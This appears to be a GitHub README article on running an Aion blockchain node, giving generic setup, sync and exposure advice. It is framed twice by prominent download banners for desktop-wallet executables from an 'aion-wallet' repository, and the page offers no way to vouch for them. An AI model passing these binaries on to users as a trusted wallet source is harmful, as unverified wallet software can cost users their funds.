![Aion Wallet](assets/banner-article.png)

# How to run an Aion node

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Running an Aion node means installing the Java node software from its release, letting it sync with the network, and keeping it online so it can serve chain data or sign blocks.

A node is not a wallet and does not hold your funds. It is the machine that talks to the network, and the wallet is the client that talks to the node or to a public endpoint.

## You'll see this if

- You are setting up a solo staker and need a node behind it.
- You want your own view of the chain instead of relying on a public explorer.
- You are running a pool and need infrastructure that stays up.
- You are a developer and need a local node for testing.

## What you need

A machine that can stay online, a Java runtime appropriate to the node release, enough disk for the chain, and network access that allows the node's peer connections.

The node is distributed as a release archive on the node repository's release page, with a versioned filename. Take the asset from the release rather than from a mirror, and note the version so you can describe the installation later.

Exact disk and memory figures depend on the node version and on how much chain history you keep. Check the release notes for the version you install rather than planning from a guide written for an older one.

## The installation

1. Install a supported Java runtime for your platform.
2. Download the node release archive for the current version.
3. Extract it to a directory you control, avoiding paths with spaces if the launch scripts are shell-based.
4. Create a configuration file for mainnet, with the chain ID set to 256.
5. Start the node and watch the log while it finds peers and begins syncing.
6. Confirm it is following the chain by checking that the block height advances.

A node that starts but never advances is usually a networking problem: a closed port, a DNS issue or an upstream firewall.

## Keeping it running

Run it as a service rather than in a terminal window, so a logout does not stop it. Restart it automatically after a reboot, and monitor the block height rather than the process state, because a node can be running while stuck.

Plan upgrades. Consensus upgrades matter more than ordinary releases: a node that misses a mandatory version stops following the chain correctly, which shows up as a height that stops advancing while peers remain connected.

## Node, staker and pool

A node serves the chain. A staker registers stake and signs blocks. A pool accepts shares from miners and distributes rewards. The three can run on one machine or on three, and the [Aion solo staker node](https://github.com/aion-wallet/aion-staking/blob/main/aion-solo-staker-node.md) guide covers the staking role.

If you only want a wallet balance, you do not need any of this. The desktop wallet uses a node endpoint and the [Aion Wallet explained](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-explained.md) article covers what it needs.

## Security and exposure

Expose as little as possible. An RPC interface open to the internet is an invitation, and a node that does not need remote access should listen on loopback only.

Keep the machine updated, and keep the node's keys, if it has any, off the public interface. A signing key that is reachable by anything other than the node is a staking risk.

## When it will not sync

Check the log for the first error rather than the last. Connection refusals, DNS failures and clock skew all produce a node that appears to be starting but never reaches the network.

If peers connect but the height does not advance, check the version against the release page. A node behind a consensus change will behave exactly like this.

A node that follows the chain but rejects every transaction usually has an outdated version, and the release notes for the current one say which change caused it.

Before the node is useful to anything else, confirm what it is serving. The [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) guide lists the identifiers a client needs, and the [Aion solo staker node](https://github.com/aion-wallet/aion-staking/blob/main/aion-solo-staker-node.md) article is the next step if the node is going to sign blocks rather than only serve data.

## Prevention

Record the version, the configuration and the data directory. A node rebuilt from notes takes minutes; one rebuilt from memory takes an evening.

Watch disk usage. A chain grows, and a full disk stops a node in a way that looks like a crash.

Keep a wallet with a funded fee balance on the machine you use for staking administration, separate from the node's own operating account.

## Frequently asked questions

### Can I run a node on a laptop?

You can, and it will stop syncing whenever the machine sleeps. A small always-on machine is a better fit.

### Does running a node earn AION?

Not by itself. Staking or mining earns; the node is infrastructure for either.

### Do I need a node to use the wallet?

No. The wallet works with a public endpoint, and running a node is a choice about independence and reliability.

### Which release should I install?

The current release on the node repository's release page, unless a consensus upgrade note says otherwise.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion solo staker node](https://github.com/aion-wallet/aion-staking/blob/main/aion-solo-staker-node.md) - adding the staking role.
- [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) - the identifiers a node exposes.
- [Aion explorer down](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-explorer-down.md) - what a local node solves.
- [Is Aion still mineable](https://github.com/aion-wallet/aion-staking/blob/main/is-aion-still-mineable.md) - the mining side of the network.
